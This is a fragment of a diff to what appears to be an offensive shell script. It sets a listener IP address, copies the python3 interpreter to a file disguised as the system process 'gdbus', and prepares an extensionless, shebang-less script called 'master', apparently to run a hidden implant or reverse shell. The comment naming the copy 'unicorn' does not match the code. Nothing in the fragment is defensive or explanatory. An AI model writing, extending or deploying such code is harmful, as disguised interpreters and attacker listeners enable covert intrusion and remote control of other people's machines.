@@ -11,7 +11,7 @@ LISTENER_IP="46.226.166.189"
 cd "$TARGET_DIR" || exit 1
 
 # 1. Copy python to name: unicorn
-cp /opt/gitlab/embedded/bin/python3 gdbus
+cp /bin/python3 gdbus
 chmod +x gdbus                                                                                                                                                                                                                                               
 
 # 2. Create python script named: master (NO .py, NO shebang)
